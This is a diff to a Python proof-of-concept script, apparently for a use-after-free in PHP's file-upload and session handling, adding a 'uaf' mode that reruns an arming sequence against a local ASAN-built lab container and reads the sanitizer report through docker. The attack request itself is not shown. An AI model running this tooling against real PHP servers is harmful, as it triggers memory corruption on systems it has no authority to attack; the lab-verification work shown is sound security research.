@@ -14,6 +14,7 @@ Usage:
   python3 check.py arm    --target http://127.0.0.1:18080/ --stall 1.5 --rounds 3
   python3 check.py arm    --target http://127.0.0.1:18081/ --docker php2shell-fpm
   python3 check.py oom    --target http://127.0.0.1:18080/
+  python3 check.py uaf    --target http://127.0.0.1:18082/ --docker php2shell-asan
 """
 
 import argparse
@@ -436,6 +437,88 @@ def cmd_oom(args):
 
 
 # ---------------------------------------------------------------------------
+# uaf: run the arming sequence against an ASAN-instrumented build and read
+#      the sanitizer report back out of the container. Confirms the memory
+#      corruption itself (heap-use-after-free), not code execution.
+# ---------------------------------------------------------------------------
+
+def _read_asan_report(container):
+    """Return the first ASAN report text found in /tmp/asan* or docker logs."""
+    try:
+        ls = subprocess.run(
+            ["docker", "exec", container, "sh", "-c", "ls /tmp/asan* 2>/dev/null"],
+            capture_output=True, text=True, timeout=10,
+        )
+        if ls.returncode == 0 and ls.stdout.strip():
+            chunks = []
+            for f in ls.stdout.split():
+                cat = subprocess.run(
+                    ["docker", "exec", container, "cat", f],
+                    capture_output=True, text=True, timeout=10,
+                )
+                if cat.stdout:
+                    chunks.append(cat.stdout)
+            text = "\n".join(chunks)
+            if "AddressSanitizer" in text or "heap-use-after-free" in text:
+                return text
+        logs = subprocess.run(
+            ["docker", "logs", "--tail", "200", container],
+            capture_output=True, text=True, timeout=10,
+        )
+        text = logs.stdout + logs.stderr
+        if "AddressSanitizer" in text or "heap-use-after-free" in text:
+            return text
+    except FileNotFoundError:
+        print("    [!] docker CLI not found; cannot read ASAN logs")
+    except subprocess.TimeoutExpired:
+        print("    [!] docker exec/logs timed out")
+    except OSError as e:
+        print(f"    [!] docker log read failed: {e}")
+    return None
+
+
+def _clear_asan_logs(container):
+    try:
+        subprocess.run(
+            ["docker", "exec", container, "sh", "-c", "rm -f /tmp/asan.*"],
+            capture_output=True, timeout=10,
+        )
+    except (OSError, subprocess.TimeoutExpired):
+        pass
+
+
+def cmd_uaf(args):
+    tgt = parse_target(args.target)
+    if not args.docker:
+        die("uaf requires --docker <container> so the ASAN log can be read")
+
+    print(f"[*] UAF confirmation against ASAN build at {tgt['url']}")
+    print(f"[*] container={args.docker}  stall={args.stall}s  rounds={args.rounds}")
+    print("[*] arming sequence identical to `arm`; ASAN catches the stale write")
+    _clear_asan_logs(args.docker)
+
+    sid = uuid.uuid4().hex
+    for rnd in range(1, args.rounds + 1):
+        _arm_once(tgt, sid, args.stall, args.chunk_size, args.insecure)
+        report = _read_asan_report(args.docker)
+        if report:
+            print(f"    round {rnd}: [+] ASAN report captured")
+            for line in report.splitlines()[:50]:
+                print(f"        {line}")
+            print(f"\n[+] heap-use-after-free CONFIRMED by AddressSanitizer (round {rnd})")
+            print("    This is the memory corruption itself. Not code execution.")
+            print("    Frames in session.c / var_unserializer map to the rfc1867 stale-pointer write.")
+            return 0
+        print(f"    round {rnd}: [-] no ASAN report yet")
+        time.sleep(0.3)
+
+    print("\n[-] no ASAN report. Confirm:")
+    print("    container built with -fsanitize=address; USE_ZEND_ALLOC=0;")
+    print("    first chunk >= 64KiB; php2shell-asan is the target, not php:8.2.34-apache")
+    return 2
+
+
+# ---------------------------------------------------------------------------
 
 def main():
     print(BANNER)
@@ -465,6 +548,15 @@ def main():
                    help="bytes per header value (default 4000)")
     o.add_argument("--memory-limit", type=int, default=32, dest="memory_limit")
     o.set_defaults(func=cmd_oom)
+
+    u = sub.add_parser("uaf", help="ASAN-confirmed heap-use-after-free (lab ASAN image)")
+    u.add_argument("--target", default="http://127.0.0.1:18082/")
+    u.add_argument("--stall", type=float, default=1.5)
+    u.add_argument("--rounds", type=int, default=3)
+    u.add_argument("--chunk-size", type=int, default=65536, dest="chunk_size")
+    u.add_argument("--docker", default="php2shell-asan",
+                   help="ASAN container name (default php2shell-asan)")
+    u.set_defaults(func=cmd_uaf)
 
     args = ap.parse_args()
     sys.exit(args.func(args))
